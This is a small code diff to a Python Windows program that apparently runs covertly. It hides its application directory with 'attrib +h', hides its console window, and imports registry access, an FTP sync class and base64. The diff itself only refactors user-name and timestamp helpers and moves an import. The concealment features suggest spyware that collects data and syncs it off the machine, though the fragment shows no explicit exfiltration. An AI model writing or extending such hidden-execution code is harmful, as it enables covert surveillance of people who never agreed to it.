@@ -6,6 +6,7 @@ import winreg
 import time
 import win32console
 import win32gui
+import win32con
 from sync_ftp import SyncFtp
 import http.server
 import base64
@@ -14,13 +15,11 @@ import platform
 
 # get the user name as identifier
 def user_name():
-    user_name = str(socket.gethostname())
-    return user_name
+    return os.getenv("USERNAME")
 
 # get the current date and time as a string
 def current_time():
-    current_time = datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')
-    return current_time
+    return datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')
 
 #For creating app dir
 def dir_path():
@@ -33,8 +32,6 @@ def dir_path():
     os.chdir(dir_path)
     os.system(f"attrib +h /s /d {app_root}") 
     return dir_path
-
-import win32con
 
 # #this hide function help to minimize the console
 def hide_console():
